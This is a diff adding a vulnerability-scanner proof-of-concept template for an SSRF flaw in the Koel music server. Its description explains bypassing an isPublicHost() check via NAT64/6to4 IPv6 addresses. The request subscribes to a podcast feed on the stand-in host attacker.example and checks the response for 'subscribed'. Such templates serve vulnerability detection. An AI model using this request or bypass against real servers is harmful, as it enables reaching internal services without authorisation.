@@ -1,0 +1,36 @@
+[info]
+author = "AVE"
+description = "通过订阅恶意 RSS 播客源，利用 NAT64/6to4 IPv6 过渡地址绕过 isPublicHost() 防护，实现 SSRF 读取内部服务响应"
+id = "POC-AVE-2026-0556"
+name = "CVE-2026-54494 PoC"
+severity = "medium"
+tags = [
+    "cve-2026-54494",
+    "ssrf",
+    "koel",
+]
+vuln_id = [
+    "CVE-2026-54494",
+    "AVE-2026-0556",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/subscription"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"url":"http://attacker.example/feed.xml"}'
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["subscribed"]
